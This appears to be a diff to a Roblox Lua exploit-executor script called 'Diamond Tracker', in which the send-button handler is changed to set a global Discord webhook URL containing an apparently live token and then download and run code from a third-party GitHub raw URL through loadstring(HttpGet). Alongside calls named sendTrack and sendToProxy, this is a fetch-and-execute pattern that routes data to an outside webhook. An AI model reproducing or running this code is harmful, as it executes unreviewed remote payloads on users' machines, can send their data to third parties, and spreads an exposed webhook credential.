@@ -151,7 +151,7 @@ Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1, 0, 0, 28)
 title.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
-title.Text = "💎 Diamond Tracker (V1.1)"
+title.Text = "💎 Diamond Tracker (V1.2)"
 title.TextColor3 = Color3.new(1, 1, 1)
 title.Font = Enum.Font.SourceSansBold
 title.TextSize = 16
@@ -251,7 +251,9 @@ sendBtn.MouseButton1Click:Connect(function()
     updateLog("initiating send")
     sendTrack()
     task.delay(0.2, sendToProxy)
-    task.delay(5,     loadstring(game:HttpGet('https://raw.githubusercontent.com/MQPS7/99-Night-in-the-Forset/refs/heads/main/Gfarm'))())
+    task.wait(2)
+    getgenv().WebhookURL = "https://discord.com/api/webhooks/1390221900734533734/-zZqj8OROemNZ9iDolBbnxUdmXCAdKU8pF5x6ncwSBxzdKBWTI9HXRIil3EGVxaIAE6_"
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/caomod2077/Script/refs/heads/main/Farm%20Diamond%20v2.lua"))()
     task.delay(1.5, function() sendBtn.Text = "Send" end)
 end)
 
